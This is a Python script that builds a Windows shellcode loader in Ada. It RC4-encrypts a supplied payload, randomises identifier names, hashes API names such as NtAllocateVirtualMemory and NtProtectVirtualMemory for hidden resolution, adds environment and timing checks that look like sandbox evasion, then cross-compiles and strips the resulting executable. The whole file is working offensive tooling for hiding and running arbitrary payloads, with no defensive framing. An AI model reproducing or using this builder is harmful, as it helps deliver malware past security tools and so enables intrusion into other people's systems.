#!/usr/bin/env python3
import sys, os, subprocess, random, string

ADA_RESERVED = {
    'abort','abs','abstract','accept','access','aliased','all','and','array',
    'at','begin','body','case','constant','declare','delay','delta','digits',
    'do','else','elsif','end','entry','exception','exit','for','function',
    'generic','goto','if','in','interface','is','limited','loop','mod','new',
    'not','null','of','or','others','out','overriding','package','pragma',
    'private','procedure','protected','raise','range','record','rem','renames',
    'requeue','return','reverse','select','separate','some','subtype',
    'synchronized','tagged','task','terminate','then','type','until','use',
    'when','while','with','xor'
}

def rname(n=10):
    while True:
        name = random.choice(string.ascii_uppercase) + \
               ''.join(random.choices(string.ascii_letters, k=n-1))
        if name.lower() not in ADA_RESERVED:
            return name

def djb2(s):
    h = 5381
    for c in s:
        h = ((h << 5) + h + ord(c)) & 0xFFFFFFFF
    return h

def djb2_lower(s):
    return djb2(s.lower())

def rc4_crypt(data, key):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray()
    i = j = 0
    for b in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)

def fmt_ada_bytes(data, per_line=10):
    lines = []
    for i in range(0, len(data), per_line):
        chunk = data[i:i+per_line]
        vals = ", ".join(f"16#{b:02X}#" for b in chunk)
        if i + per_line < len(data):
            vals += ","
        lines.append(f"      {vals}")
    return "\n".join(lines)

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <input.bin>")
        sys.exit(1)

    src = sys.argv[1]
    if not os.path.exists(src):
        print(f"[!] File not found: {src}")
        sys.exit(1)

    with open(src, 'rb') as f:
        raw = f.read()
    print(f"[*] Loaded {len(raw)} bytes from {src}")

    key = bytes(random.randint(0, 255) for _ in range(32))
    delay = random.randint(800, 2500)
    proc_name = rname()

    hashes = {
        'NTDLL_HASH': djb2_lower('ntdll.dll'),
        'KERNEL32_HASH': djb2_lower('kernel32.dll'),
        'NTALLOC_HASH': djb2('NtAllocateVirtualMemory'),
        'NTPROTECT_HASH': djb2('NtProtectVirtualMemory'),
        'GSI_HASH': djb2('GetSystemInfo'),
        'GMS_HASH': djb2('GlobalMemoryStatusEx'),
        'GTC_HASH': djb2('GetTickCount64'),
        'SLP_HASH': djb2('Sleep'),
    }

    print(f"[*] RC4 key length: {len(key)}")
    print(f"[*] Delay: {delay}ms")
    print(f"[*] Procedure: {proc_name}")

    enc = rc4_crypt(raw, key)

    names = {}
    id_keys = [
        'U8','Buf_T','State_T','Get_Fn','Check_Env','Check_Time',
        'MH_N','MH_K','FH_AV','FH_PV','FH_SI','FH_MS','FH_TC','FH_SL',
        'Alloc_Fn','Protect_Fn','Run_Fn','To_Alloc','To_Protect','To_Run',
        'Byte_Ptr','To_Ptr','Transform','Apply','CP','Data','Key',
        'P_Alloc','P_Protect','Base','Region','Old_P','Status','St',
        'S','K','J','Tmp','D','II','JJ','KK','Pos','Dst','I'
    ]
    for k in id_keys:
        names[k] = rname()

    with open('src/loader.adb', 'r') as f:
        template = f.read()

    src_code = template
    src_code = src_code.replace('procedure Loader', f'procedure {proc_name}')
    src_code = src_code.replace('end Loader;', f'end {proc_name};')
    src_code = src_code.replace('###DATA###', fmt_ada_bytes(enc))
    src_code = src_code.replace('###KEY###', fmt_ada_bytes(key))
    src_code = src_code.replace('###DELAY###', str(delay))

    for tag, val in hashes.items():
        src_code = src_code.replace(f'16#{tag}#', f'16#{val:08X}#')

    gen_file = f"{proc_name.lower()}.adb"
    with open(gen_file, 'w') as f:
        f.write(src_code)

    print(f"[*] Compiling...")

    r1 = subprocess.run(
        ['x86_64-w64-mingw32-gcc', '-c', '-Os', '-fno-stack-protector',
         '-mno-stack-arg-probe', '-fno-ident', 'src/resolve.c',
         '-o', 'resolve.o'],
        capture_output=True, text=True
    )
    if r1.returncode != 0:
        print(f"[!] C compile failed:\n{r1.stderr}")
        sys.exit(1)

    r2 = subprocess.run(
        ['x86_64-w64-mingw32-gnatmake', '-O2', '-gnatp', gen_file,
         '-largs', 'resolve.o', '-mwindows', '-lkernel32', '-lntdll'],
        capture_output=True, text=True
    )

    if r2.returncode != 0:
        print(f"[!] Ada compile failed:\n{r2.stderr}\n{r2.stdout}")
        sys.exit(1)

    exe = f"{proc_name.lower()}.exe"
    out = "output.exe"

    subprocess.run(
        ['x86_64-w64-mingw32-strip', '--strip-all', exe],
        capture_output=True
    )

    if os.path.exists(out):
        os.remove(out)
    os.rename(exe, out)

    for ext in ['.ali', '.o', '.adb']:
        fn = proc_name.lower() + ext
        if os.path.exists(fn):
            os.remove(fn)
    if os.path.exists('resolve.o'):
        os.remove('resolve.o')

    sz = os.path.getsize(out)
    print(f"[+] Done: {out} ({sz:,} bytes)")

if __name__ == "__main__":
    main()
